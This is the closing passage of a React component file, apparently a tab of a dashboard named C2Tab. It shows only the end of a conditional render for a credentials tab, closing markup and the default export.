            {activeTab === 'credentials' && renderCredentials()}
          </div>
        </div>
      </div>
    </div>
  );
};

export default C2Tab;
